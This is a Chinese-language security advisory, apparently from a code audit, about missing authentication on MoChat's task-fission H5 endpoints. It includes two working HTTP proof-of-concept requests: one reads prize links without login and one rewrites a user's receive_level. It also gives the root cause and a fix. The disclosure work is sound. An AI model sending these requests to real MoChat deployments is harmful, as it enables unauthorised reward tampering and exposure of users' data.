# MoChat 任务宝 H5 未鉴权（MC-VULN-006）

| 字段 | 内容 |
|------|------|
| 厂商 | mochat-cloud |
| 产品 | MoChat |
| 版本 | master（Hyperf 2.2） |
| 类型 | 关键功能缺少认证 |
| CWE | CWE-306 / CWE-639 |
| 权限 | 无需登录 |

## 简述

`GET /operation/workFission/taskData` 不带任何登录态也能读到活动奖品链接。  
`PUT /operation/workFission/receive` 校验规则是空的，随便传 `union_id` + `level` 就能改库里的 `receive_level`。

根因很简单：Operation 侧那几个 Action 没挂 `@Middleware`，`Receive::rules()` 直接返回 `[]`。

## 复现（Yakit）

完整请求包见：[`../poc/MC-VULN-006/YAKIT-PoC.md`](../poc/MC-VULN-006/YAKIT-PoC.md)

### 1. 未登录读奖品

```http
GET /operation/workFission/taskData?union_id=union_poc_test&fission_id=1 HTTP/1.1
Host: 127.0.0.1:9501
Accept: application/json
Connection: close


```

本地结果：`code=200`，`data.task` 里能看到 `gift_url`。

![taskData](./screenshots/MC-VULN-006-01-taskData.png)

### 2. 未登录改领取等级

```http
PUT /operation/workFission/receive HTTP/1.1
Host: 127.0.0.1:9501
Content-Type: application/json
Accept: application/json
Connection: close

{"union_id":"union_poc_test","level":5}
```

返回 `code=200`。再查表 `mc_work_fission_contact`，对应行的 `receive_level` 已经变成 5。

![receive](./screenshots/MC-VULN-006-02-receive.png)

![DB](./screenshots/MC-VULN-006-03-db-receive-level.png)

## 影响

活动白嫖、领奖链路被改。邀请关系列表接口还会带出昵称头像一类信息（同一套未鉴权 H5）。

## 修法

H5 接口加上会话或签名校验。`union_id` 必须跟当前会话绑定。等级只能由服务端按任务进度算，别信客户端传的 `level`。

## 参考

- 审计：`SECURITY_AUDIT_REPORT.md` §MC-VULN-006  
- 核实：`POC_VERIFICATION_REPORT.md`  
- Yakit：`poc/MC-VULN-006/YAKIT-PoC.md`
